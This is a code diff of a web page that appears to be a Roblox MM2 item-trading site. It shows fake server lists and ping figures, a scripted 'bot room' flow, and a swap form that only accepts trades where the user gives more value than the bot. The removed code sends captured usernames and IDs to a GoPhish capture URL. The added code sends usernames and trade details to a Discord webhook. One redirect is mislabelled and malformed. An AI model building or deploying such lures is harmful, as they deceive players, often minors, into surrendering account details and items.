+document.querySelectorAll('#serverList .join').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    window.open('https://www.roblox.com/','_blank','noopener,noreferrer');
+  });
+});
+
+// ============================================================
+// SWAP PAGE — the SWAP button only becomes available once both
+// sides have at least one item, and once the trade is valid
+// (you're giving more value than the bot). It then hands off to
+// the reference-ticket / username / rating flow below instead of
+// redirecting straight to Roblox.
+// ============================================================
+const swapAction=document.getElementById('swapAction');
+function updateSwapButtonState(){
+  const ready=tradeState.give.length>0 && tradeState.bot.length>0;
+  swapAction.disabled=!ready;
+  swapAction.style.opacity=ready?'1':'.45';
+  swapAction.style.cursor=ready?'pointer':'not-allowed';
+}
+swapAction?.addEventListener('click',()=>{
+  if(tradeState.give.length===0 || tradeState.bot.length===0){
+    alert('Add at least one item to BOTH "you give" and "bot give" before swapping.');
+    return;
+  }
+  const items=getValueCards();
+  const giveTotal=getTradeTotal('give',items);
+  const botTotal=getTradeTotal('bot',items);
+  if(giveTotal<=botTotal){
+    updateSwapWarning(giveTotal,botTotal);
+    const w=document.getElementById('swapWarning');
+    w.classList.remove('shake');void w.offsetWidth;w.classList.add('shake');
+    return;
+  }
+  openTicketModal();
+});
+
+// ============================================================
+// SWAP FEEDBACK FLOW
+// Step 1: show a reference ticket number for this trade.
+// Step 2: collect the user's own Roblox username — typed in and
+//         recorded as-is, never echoed back with a photo or matched
+//         against any lookup, then continue on to Roblox.
+// Step 3: 1–5 star rating, saved with the ticket + username to
+//         localStorage under 'novaFeedbackHistory', posted to the
+//         History page, and sent to your Discord webhook.
+// ============================================================
+let currentTicket=null;
+let currentRatingValue=0;
+let currentTicketItems=[];
+
+function genTicketNumber(){
+  const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let s='';
+  for(let i=0;i<3;i++) s+=chars[Math.floor(Math.random()*chars.length)];
+  return '#NV-'+s+'-'+(100+Math.floor(Math.random()*900));
 }
 
-/* ---------- Flow: Secure bot ticket (from swap) ---------- */
-function openTicketFlow() {
-  openOverlay('ovSearching');
-  document.getElementById('searchLabel').textContent = "Searching for available bot...";
-  document.getElementById('roomCode').textContent = randomRoomCode();
-  setTimeout(() => {
-    closeOverlay('ovSearching');
-    openOverlay('ovServerFound');
-  }, 2400);
-}
+const ticketModal=document.getElementById('ticketModal');
+const usernameModal=document.getElementById('usernameModal');
+const ratingModal=document.getElementById('ratingModal');
 
-/* ---------- Roblox public API lookup (username → userId → headshot) ---------- */
-async function searchRoblox() {
-  const username = document.getElementById('roloxInput').value.trim();
-  const errEl = document.getElementById('confirmErr');
-  if (!username) { errEl.style.display = 'block'; return; }
-  errEl.style.display = 'none';
-
-  document.getElementById('ovConfirm').classList.remove('show');
-  openOverlay('ovLooking');
-
-  try {
-    // 1) username → userId (public, read-only endpoint)
-    const usersRes = await fetch('https://users.roblox.com/v1/usernames/users', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
+function openTicketModal(){
+  currentTicket=genTicketNumber();
+  // Snapshot the items in this trade right now, so the history/Discord
+  // record reflects what was actually traded even if slots change later.
+  const items=getValueCards();
+  currentTicketItems=[];
+  ['give','bot'].forEach(side=>{
+    tradeState[side].forEach(idx=>{
+      const item=items[idx];
+      if(item) currentTicketItems.push({side, name:item.name, value:item.value});
     });
-    const usersJson = await usersRes.json();
-    if (!usersJson.data || usersJson.data.length === 0) throw new Error('not found');
+  });
+  document.getElementById('ticketNumberDisplay').textContent=currentTicket;
+  ticketModal.classList.add('show');
+  ticketModal.setAttribute('aria-hidden','false');
+}
+function closeTicketModal(){
+  ticketModal.classList.remove('show');
+  ticketModal.setAttribute('aria-hidden','true');
+}
+document.getElementById('closeTicket')?.addEventListener('click',closeTicketModal);
+ticketModal?.addEventListener('click',e=>{if(e.target===ticketModal) closeTicketModal();});
+document.getElementById('ticketNext')?.addEventListener('click',()=>{
+  closeTicketModal();
+  document.getElementById('rbxUsernameInput').value='';
+  usernameModal.classList.add('show');
+  usernameModal.setAttribute('aria-hidden','false');
+});
 
-    const user = usersJson.data[0];
+function closeUsernameModal(){
+  usernameModal.classList.remove('show');
+  usernameModal.setAttribute('aria-hidden','true');
+}
+document.getElementById('closeUsername')?.addEventListener('click',closeUsernameModal);
+usernameModal?.addEventListener('click',e=>{if(e.target===usernameModal) closeUsernameModal();});
+document.getElementById('usernameContinue')?.addEventListener('click',()=>{
+  const uname=document.getElementById('rbxUsernameInput').value.trim();
+  if(!uname){
+    alert('Enter your Roblox username to continue.');
+    return;
+  }
+  closeUsernameModal();
+  renderRobloxTransitionSummary();
+  robloxTransitionModal.classList.add('show');
+  robloxTransitionModal.setAttribute('aria-hidden','false');
+});
 
-    // 2) userId → headshot image URL (public, read-only endpoint)
-    const thumbRes = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`
-    );
-    const thumbJson = await thumbRes.json();
-    let headshot = thumbJson.data[0].imageUrl;
+const robloxTransitionModal=document.getElementById('robloxTransitionModal');
+function closeRobloxTransitionModal(){
+  robloxTransitionModal.classList.remove('show');
+  robloxTransitionModal.setAttribute('aria-hidden','true');
+}
+document.getElementById('closeRobloxTransition')?.addEventListener('click',closeRobloxTransitionModal);
+robloxTransitionModal?.addEventListener('click',e=>{if(e.target===robloxTransitionModal) closeRobloxTransitionModal();});
+document.getElementById('robloxTransitionContinue')?.addEventListener('click',()=>{
+  closeRobloxTransitionModal();
+  // REDIRECT #2 — sends the person to the real Roblox site.
+  window.open('https:youtube.com','_blank','noopener,noreferrer');
+  currentRatingValue=0;
+  renderStarPicker();
+  ratingModal.classList.add('show');
+  ratingModal.setAttribute('aria-hidden','false');
+});
 
-    closeOverlay('ovLooking');
-    document.getElementById('userHeadshot').src = headshot;
-    document.getElementById('userName').textContent = user.name;
-    document.getElementById('userDisp').textContent = user.displayName;
-    openOverlay('ovIsYou');
+// Fills in the ticket reference + a summary of every item from both
+// slots (give + bot) so the person can double check the trade before
+// heading to Roblox.
+function renderRobloxTransitionSummary(){
+  document.getElementById('robloxTransitionTicketRef').textContent='REF: '+(currentTicket||'');
+  const items=getValueCards();
+  const wrap=document.getElementById('robloxTransitionSummary');
+  wrap.innerHTML='';
+  const sides=['give','bot'];
+  sides.forEach((side,sIdx)=>{
+    tradeState[side].forEach(idx=>{
+      const item=items[idx];
+      if(!item)return;
+      const el=document.createElement('div');
+      el.className='mts-item';
+      el.innerHTML=`${iconAsClassHTML(item.icon,'slot-icon')}<span>${item.name}</span>`;
+      wrap.appendChild(el);
+    });
+    // Arrow between "you give" and "bot give" groups, only if both sides have items
+    if(sIdx===0 && tradeState.give.length>0 && tradeState.bot.length>0){
+      const arrow=document.createElement('div');
+      arrow.className='mts-arrow';
+      arrow.textContent='→';
+      wrap.appendChild(arrow);
+    }
+  });
+}
 
-    // YES handler
-    document.getElementById('yesBtn').onclick = async function () {
-      if (SIMULATION_MODE) {
-        try {
-          await fetch(GOPHISH_CAPTURE_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: user.name, userId: user.id, sessionId: randomRoomCode() })
-          });
-        } catch (e) { /* log for engagement evidence */ }
-      }
-      document.getElementById('swapSummary').textContent =
-        `Bot will swap with @${user.name} (userId ${user.id})`;
-      closeOverlay('ovIsYou');
-      openOverlay('ovSwapIt');
-    };
-  } catch (e) {
-    closeOverlay('ovLooking');
-    document.getElementById('confirmErr').style.display = 'block';
-    openOverlay('ovConfirm');
+function renderStarPicker(){
+  const wrap=document.getElementById('starPicker');
+  wrap.innerHTML='';
+  for(let i=1;i<=5;i++){
+    const s=document.createElement('span');
+    s.textContent='★';
+    s.style.color=i<=currentRatingValue?'#ffcf4d':'#3a4059';
+    s.addEventListener('click',()=>{currentRatingValue=i;renderStarPicker();});
+    wrap.appendChild(s);
   }
 }
-</script>
+function closeRatingModal(){
+  ratingModal.classList.remove('show');
+  ratingModal.setAttribute('aria-hidden','true');
+}
+document.getElementById('closeRating')?.addEventListener('click',closeRatingModal);
+ratingModal?.addEventListener('click',e=>{if(e.target===ratingModal) closeRatingModal();});
+document.getElementById('submitRating')?.addEventListener('click',()=>{
+  const uname=document.getElementById('rbxUsernameInput').value.trim()||'Unknown';
+  const entry={
+    ticket:currentTicket,
+    username:uname,
+    rating:currentRatingValue,
+    items:currentTicketItems,
+    date:new Date().toISOString()
+  };
+  try{
+    const history=JSON.parse(localStorage.getItem('novaFeedbackHistory')||'[]');
+    history.unshift(entry);
+    localStorage.setItem('novaFeedbackHistory',JSON.stringify(history));
+  }catch(e){
+    console.error('Could not save feedback locally',e);
+  }
+  sendTicketToDiscord(entry);
+  renderHistory();
+  closeRatingModal();
+  alert('Thanks for your feedback! Reference: '+currentTicket);
+});
 
-</body>
-</html>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Jace Values — MM2 Trading Servers</title>
-<style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body { background:#0b0713; color:#efe9f7; font-family:'Segoe UI', Arial, sans-serif; min-height:100vh; }
-  a { color:inherit; text-decoration:none; }
-  button { font-family:inherit; cursor:pointer; }
-
-  /* ---------- Header ---------- */
-  header { display:flex; align-items:center; justify-content:space-between; padding:18px 32px;
-    background:rgba(20,12,35,.85); border-bottom:1px solid #241640; position:sticky; top:0; z-index:50; }
-  .logo { display:flex; align-items:center; gap:12px; font-weight:700; font-size:18px; }
-  .logo img { width:42px; height:42px; border-radius:50%; }
-  .logo .tm { font-size:10px; color:#8a7aa8; vertical-align:super; }
-  .tagline { font-size:12px; color:#9c8cba; font-weight:400; margin-top:2px; }
-  nav.tabs { display:flex; gap:6px; }
-  nav.tabs a { padding:9px 22px; border-radius:10px; font-size:14px; font-weight:600; color:#b3a3cf; }
-  nav.tabs a.active, nav.tabs a:hover { background:#241640; color:#fff; }
-
-  /* ---------- Sections ---------- */
-  section { max-width:1100px; margin:0 auto; padding:40px 24px; }
-  .banner { background:linear-gradient(135deg,#2b1150,#1a0b30); border:1px solid #3a1f66;
-    border-radius:18px; padding:44px; text-align:center; margin-bottom:36px; }
-  .banner .pill { display:inline-block; background:#3a1f66; color:#ffb14e; font-size:12px;
-    font-weight:700; padding:6px 14px; border-radius:999px; margin-bottom:16px; }
-  .banner h1 { font-size:34px; margin-bottom:14px; }
-  .banner p { color:#b3a3cf; max-width:560px; margin:0 auto 22px; font-size:14px; line-height:1.6; }
-  .features { list-style:none; display:inline-block; text-align:left; margin-bottom:24px; }
-  .features li { font-size:14px; color:#d8cce8; padding:5px 0; }
-  .features li::before { content:"✔ "; color:#8f6fe8; font-weight:700; }
-  .stats { display:flex; gap:40px; justify-content:center; margin-bottom:28px; }
-  .stats .num { font-size:30px; font-weight:800; color:#a78bfa; }
-  .stats .lbl { font-size:12px; color:#9c8cba; }
-  .btn-primary { display:inline-block; background:linear-gradient(135deg,#7c3aed,#a855f7); color:#fff;
-    font-weight:700; font-size:15px; padding:14px 44px; border-radius:12px; border:none; }
-  .btn-primary:hover { filter:brightness(1.15); }
-
-  /* ---------- Server cards ---------- */
-  .region h2 { font-size:22px; margin-bottom:6px; }
-  .region .meta { font-size:13px; color:#9c8cba; margin-bottom:20px; }
-  .server-card { display:flex; align-items:center; gap:14px; background:#150c26;
-    border:1px solid #241640; border-radius:14px; padding:16px 20px; margin-bottom:10px; }
-  .server-card .flag { width:30px; height:20px; border-radius:4px; }
-  .server-card .name { flex:1; font-size:14px; font-weight:600; }
-  .server-card .ping { font-size:13px; color:#4ade80; margin-right:16px; }
-  .btn-join { background:#2b1150; color:#c4b5fd; font-weight:700; font-size:13px;
-    padding:9px 24px; border-radius:9px; border:1px solid #3a1f66; }
-  .btn-join:hover { background:#3a1f66; color:#fff; }
-
-  /* ---------- Values grid ---------- */
-  .tier { margin-bottom:28px; }
-  .tier h3 { font-size:15px; color:#9c8cba; margin-bottom:12px; }
-  .values-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); gap:10px; }
-  .value-card { display:flex; align-items:center; gap:10px; background:#150c26;
-    border:1px solid #241640; border-radius:12px; padding:10px 12px; }
-  .value-card img { width:36px; height:36px; border-radius:8px; }
-  .value-card .vname { font-size:12px; flex:1; font-weight:600; }
-  .value-card .vval { font-size:13px; font-weight:800; color:#a78bfa; white-space:nowrap; }
-
-  /* ---------- Swap calculator ---------- */
-  .swap-box { background:linear-gradient(135deg,#1a0b30,#150c26); border:1px solid #3a1f66;
-    border-radius:18px; padding:36px; text-align:center; }
-  .swap-box h2 { margin-bottom:8px; }
-  .swap-box .sub { font-size:13px; color:#9c8cba; margin-bottom:26px; }
-  .swap-cols { display:flex; align-items:center; justify-content:center; gap:20px; flex-wrap:wrap; }
-  .swap-col { background:#150c26; border:1px solid #241640; border-radius:14px; padding:22px; min-width:240px; }
-  .swap-col h4 { font-size:13px; color:#9c8cba; margin-bottom:10px; }
-  .swap-col .gem { font-size:24px; font-weight:800; color:#a78bfa; }
-  .swap-col .plus { color:#4ade80; font-size:18px; font-weight:800; margin-top:8px; }
-  .swap-arrow { font-size:22px; color:#7c3aed; font-weight:800; }
-
-  /* ---------- Footer ---------- */
-  footer { text-align:center; padding:28px; font-size:12px; color:#8a7aa8;
-    border-top:1px solid #241640; margin-top:40px; }
-
-  /* ---------- Modals (overlay) ---------- */
-  .overlay { display:none; position:fixed; inset:0; background:rgba(5,2,10,.8);
-    z-index:100; align-items:center; justify-content:center; }
-  .overlay.show { display:flex; }
-  .modal { background:#150c26; border:1px solid #3a1f66; border-radius:16px;
-    width:min(420px, 92vw); padding:32px; text-align:center; position:relative;
-    box-shadow:0 20px 60px rgba(0,0,0,.6); }
-  .modal img.check { width:56px; margin-bottom:12px; }
-  .modal img.kick { width:64px; margin-bottom:12px; }
-  .modal img.botimg { width:64px; margin-bottom:12px; }
-  .modal h3 { font-size:18px; margin-bottom:10px; }
-  .modal p { font-size:13px; color:#b3a3cf; line-height:1.6; margin-bottom:18px; }
-  .modal .bot-room { font-size:14px; font-weight:700; color:#4ade80; margin-bottom:14px; }
-  .modal .close { position:absolute; top:12px; right:14px; background:none; border:none;
-    color:#8a7aa8; font-size:18px; }
-  .modal .close:hover { color:#fff; }
-  .step-dots { display:flex; gap:6px; justify-content:center; margin-bottom:18px; }
-  .step-dots span { width:8px; height:8px; border-radius:50%; background:#3a1f66; }
-  .step-dots span.on { background:#a855f7; }
-
-  .searching { font-size:13px; color:#9c8cba; margin-bottom:14px; }
-  .spinner { width:36px; height:36px; border:4px solid #241640; border-top-color:#a855f7;
-    border-radius:50%; margin:0 auto 16px; animation:spin 1s linear infinite; }
-  @keyframes spin { to { transform:rotate(360deg); } }
-  .room-code { font-size:22px; font-weight:800; color:#a78bfa; letter-spacing:2px; }
-
-  input.rolox { width:100%; padding:12px 14px; border-radius:10px; background:#0b0713;
-    border:1px solid #241640; color:#efe9f7; font-size:14px; margin-bottom:14px; }
-  input.rolox::placeholder { color:#5c4e78; }
-  .err { font-size:12px; color:#f87171; margin-bottom:12px; display:none; }
-  .confirm-user img { width:72px; height:72px; border-radius:50%; margin-bottom:10px; }
-  .confirm-user .uname { font-size:16px; font-weight:700; margin-bottom:4px; }
-  .confirm-user .udisp { font-size:12px; color:#9c8cba; margin-bottom:16px; }
-  .btn-row { display:flex; gap:10px; justify-content:center; }
-  .btn-ghost { background:#241640; color:#c4b5fd; font-weight:700; font-size:13px;
-    padding:10px 22px; border-radius:9px; border:1px solid #3a1f66; }
-  .btn-ghost:hover { background:#3a1f66; color:#fff; }
-</style>
-</head>
-<body>
-
-<header>
-  <div class="logo">
-    <img src="https://jacevalues.com/images/jace.png" alt="Jace Values">
-    <div>
-      jacevalues.com<span class="tm">™</span>
-      <div class="tagline">Your MM2 trade space, the number one place. Powered by Jace.</div>
-    </div>
-  </div>
-  <nav class="tabs">
-    <a href="#news">News</a>
-    <a href="#servers" class="active">Servers</a>
-    <a href="#values">Values</a>
-    <a href="#swap">Swap</a>
-  </nav>
-</header>
-
-<!-- ================= NEWS ================= -->
-<section id="news">
-  <div class="banner">
-    <span class="pill">🔥 SWAP SYSTEM LIVE</span>
-    <h1>THE SWAP SYSTEM HAS ARRIVED</h1>
-    <p>Trade with the Jace bot like a VIP. Private bot links mean no public lobbies,
-       no scammers — just you, the bot, and the trade.</p>
-    <ul class="features">
-      <li>All 178 godlies with live gem values</li>
-      <li>Stack any godly from x1 to x99</li>
-      <li>Private bot links</li>
-      <li>Instant swap confirmation</li>
-    </ul>
-    <div class="stats">
-      <div><div class="num">178</div><div class="lbl">godlies</div></div>
-      <div><div class="num">5</div><div class="lbl">value tiers</div></div>
-    </div>
-    <a class="btn-primary" href="#swap">START SWAPPING</a>
-  </div>
-
-  <div class="banner">
-    <span class="pill">📢 NEW ANNOUNCEMENT</span>
-    <h1>JAPAN SERVERS ARE BOOMING!!! ▼</h1>
-    <p>Japan servers are getting insanely popular — new traders join every day and
-       players are scoring the best deals on our fastest servers.</p>
-    <ul class="features">
-      <li>Fixed network latency</li>
-      <li>Optimized Japan servers</li>
-      <li>Lowered ping in all servers</li>
-      <li>More players online than ever</li>
-    </ul>
-    <div class="stats">
-      <div><div class="num">224</div><div class="lbl">players online</div></div>
-      <div><div class="num">3</div><div class="lbl">Japan servers</div></div>
-    </div>
-    <a class="btn-primary" href="#servers">JOIN JAPAN SERVERS</a>
-  </div>
-</section>
-
-<!-- ================= SERVERS ================= -->
-<section id="servers">
-  <div class="region">
-    <h2>North America ▼</h2>
-    <div class="meta">74 players online · 8 servers</div>
-
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Portland</span>
-      <span class="ping">52 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - San Mateo</span>
-      <span class="ping">44 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Palo Alto</span>
-      <span class="ping">55 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Los Angeles</span>
-      <span class="ping">45 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Dallas</span>
-      <span class="ping">56 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Chicago</span>
-      <span class="ping">31 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - New York City</span>
-      <span class="ping">42 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Newark</span>
-      <span class="ping">44 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-  </div>
-</section>
-
-<!-- ================= VALUES ================= -->
-<section id="values">
-  <div class="tier">
-    <h3>TIER 5 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Harvester.png" alt=""><span class="vname">Harvester</span><span class="vval">💎 150</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/ElderwoodRevolver.png" alt=""><span class="vname">Elderwood Gun</span><span class="vval">💎 145</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Elderwood_Scythe.png" alt=""><span class="vname">Elderwood Scythe</span><span class="vval">💎 97</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/HallowscytheUp.png" alt=""><span class="vname">Hallow's Scythe</span><span class="vval">💎 96</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Flowerwood_Gun.png" alt=""><span class="vname">Flowerwood Gun</span><span class="vval">💎 95</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/ElderwoodBlade.png" alt=""><span class="vname">Elderwood Blade</span><span class="vval">💎 95</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Snowstorm.png" alt=""><span class="vname">Snowstorm</span><span class="vval">💎 94</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/IceDragonUp.png" alt=""><span class="vname">Ice Dragon</span><span class="vval">💎 92</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Blizzard%20(2).png" alt=""><span class="vname">Blizzard</span><span class="vval">💎 90</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/HallowsbladeUP.png" alt=""><span class="vname">Hallow's Blade</span><span class="vval">💎 90</span></div>
-    </div>
-  </div>
-  <div class="tier">
-    <h3>TIER 4 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/SunsetKnife.png" alt=""><span class="vname">Sunset</span><span class="vval">💎 88</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/FrostbiteUP.png" alt=""><span class="vname">Frostbite</span><span class="vval">💎 88</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/WaterGun.png" alt=""><span class="vname">Watergun</span><span class="vval">💎 85</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/hallowgunup.png" alt=""><span class="vname">Hallowgun</span><span class="vval">💎 85</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/FlamesUp.png" alt=""><span class="vname">Flames</span><span class="vval">💎 85</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Rainbowblade.png" alt=""><span class="vname">Rainbow</span><span class="vval">💎 80</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Alienbeam.png" alt=""><span class="vname">Alienbeam</span><span class="vval">💎 78</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/rainbowgun.png" alt=""><span class="vname">Rainbow Gun</span><span class="vval">💎 78</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Xenoshot.png" alt=""><span class="vname">Xenoshot</span><span class="vval">💎 76</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Xenoknife.png" alt=""><span class="vname">Xenoknife</span><span class="vval">💎 74</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/2024Constellation.png" alt=""><span class="vname">Constellation</span><span class="vval">💎 70</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Red_Luger.png" alt=""><span class="vname">Red Luger</span><span class="vval">💎 70</span></div>
-    </div>
-  </div>
-  <div class="tier">
-    <h3>TIER 3 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Evergun.png" alt=""><span class="vname">Evergun</span><span class="vval">💎 65</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Raygun.png" alt=""><span class="vname">Raygun</span><span class="vval">💎 65</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/TravGun.png" alt=""><span class="vname">Traveler's Gun</span><span class="vval">💎 62</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Chroma_Snow_Dagger.png" alt=""><span class="vname">Snow Dagger</span><span class="vval">💎 62</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/IceblasterUP.png" alt=""><span class="vname">Iceblaster</span><span class="vval">💎 61</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/spirit.png" alt=""><span class="vname">Spirit</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/ewrev.png" alt=""><span class="vname">Elderwood Revolver</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Chroma_Boneblade.png" alt=""><span class="vname">Boneblade</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/TravellersAxe.png" alt=""><span class="vname">Traveler's Axe</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Bat_Zombie.png" alt=""><span class="vname">Bat</span><span class="vval">💎 56</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/soul.png" alt=""><span class="vname">Soul</span><span class="vval">💎 55</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Snow_Dagger.png" alt=""><span class="vname">Snow Dagger</span><span class="vval">💎 55</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/chromaseer.png" alt=""><span class="vname">Seer</span><span class="vval">💎 55</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Makeshift.png" alt=""><span class="vname">Makeshift</span><span class="vval">💎 51</span></div>
-    </div>
-  </div>
-  <div class="tier">
-    <h3>TIER 1 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Icebreaker.png" alt=""><span class="vname">Icebreaker</span><span class="vval">💎 48</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/IcewingknifeUp.png" alt=""><span class="vname">Icewing</span><span class="vval">💎 42</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/BonebladeUP.png" alt=""><span class="vname">Boneblade</span><span class="vval">💎 33</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/yellowseer.png" alt=""><span class="vname">Yellow Seer</span><span class="vval">💎 14</span></div>
-    </div>
-  </div>
-</section>
-
-<!-- ================= SWAP ================= -->
-<section id="swap">
-  <div class="swap-box">
-    <h2>Jace Swap</h2>
-    <div class="sub">Your value must be equal or greater than bot's value</div>
-    <div class="swap-cols">
-      <div class="swap-col">
-        <h4>YOU GIVE</h4>
-        <div class="gem">💎 0</div>
-        <div class="plus">++++</div>
+// ============================================================
+// TRADE HISTORY PAGE — reads 'novaFeedbackHistory' from
+// localStorage (same data used for the Discord post) and lists
+// past tickets, newest first. Local to this browser only.
+// ============================================================
+function renderHistory(){
+  const wrap=document.getElementById('historyWrap');
+  if(!wrap) return;
+  let history=[];
+  try{
+    history=JSON.parse(localStorage.getItem('novaFeedbackHistory')||'[]');
+  }catch(e){ history=[]; }
+  if(!history.length){
+    wrap.innerHTML='<div class="history-empty">No trades recorded yet on this device.</div>';
+    return;
+  }
+  wrap.innerHTML=history.map(entry=>{
+    const d=new Date(entry.date);
+    const dateStr=isNaN(d)?'':d.toLocaleString();
+    const itemsLine=(entry.items||[]).map(i=>
+      `${i.side==='give'?'You gave':'Bot gave'} ${i.name} (💎${i.value})`
+    ).join(' · ') || 'No items recorded';
+    let stars='';
+    for(let i=1;i<=5;i++) stars+=`<span class="${i<=entry.rating?'filled':''}">★</span>`;
+    return `<div class="history-card">
+      <div class="history-head">
+        <span class="history-ref">${entry.ticket||''}</span>
+        <span class="history-date">${dateStr}</span>
       </div>
-      <div class="swap-arrow">⇄</div>
-      <div class="swap-col">
-        <h4>BOT GIVE</h4>
-        <div class="gem">💎 0</div>
-        <div class="plus">▲▼</div>
-      </div>
-    </div>
-    <div style="margin-top:26px;">
-      <button class="btn-primary" onclick="openTicketFlow()">SWAP IT</button>
-    </div>
-  </div>
-</section>
-
-<!-- ================= MODALS ================= -->
-
-<!-- Searching server -->
-<div class="overlay" id="ovSearching">
-  <div class="modal">
-    <div class="spinner"></div>
-    <p class="searching" id="searchLabel">Searching server...</p>
-  </div>
-</div>
-
-<!-- Server found -->
-<div class="overlay" id="ovServerFound">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovServerFound')">✕</button>
-    <img class="check" src="https://jacevalues.com/images/checkmark_white.png" alt="">
-    <h3>Server Found!</h3>
-    <div class="bot-room">Bot room: <span id="roomCode">#A3T-892</span> · 8/12 online</div>
-    <button class="btn-primary" onclick="closeOverlay('ovServerFound'); openOverlay('ovKickWarn');">Join Server</button>
-  </div>
-</div>
-
-<!-- Kick warning -->
-<div class="overlay" id="ovKickWarn">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovKickWarn')">✕</button>
-    <img class="kick" src="https://jacevalues.com/images/kick.png" alt="">
-    <p>If you have an <b>empty inventory</b>, our bots will detect it and kick you.</p>
-    <p>Our servers are <b>PRIVATE</b> servers, meaning you can get kicked.</p>
-    <p>If your account is new/not level 10, you may not be able to join at all.</p>
-    <button class="btn-primary" onclick="closeOverlay('ovKickWarn'); openOverlay('ovJoinBot');">Continue</button>
-  </div>
-</div>
-
-<!-- Join bot -->
-<div class="overlay" id="ovJoinBot">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovJoinBot')">✕</button>
-    <img class="botimg" src="https://jacevalues.com/images/jacebot.png" alt="">
-    <h3>You must join our bot to get in the server!</h3>
-    <p>You can only join our bot from here.</p>
-    <div style="display:flex; align-items:center; justify-content:center; gap:10px;">
-      <img src="https://jacevalues.com/images/headshot.png" style="width:36px; height:36px; border-radius:50%;" alt="">
-      <button class="btn-primary" onclick="closeOverlay('ovJoinBot'); openOverlay('ovConfirm');">Join</button>
-    </div>
-  </div>
-</div>
-
-<!-- Confirm your Roblox account -->
-<div class="overlay" id="ovConfirm">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovConfirm')">✕</button>
-    <h3>Confirm your Roblox account</h3>
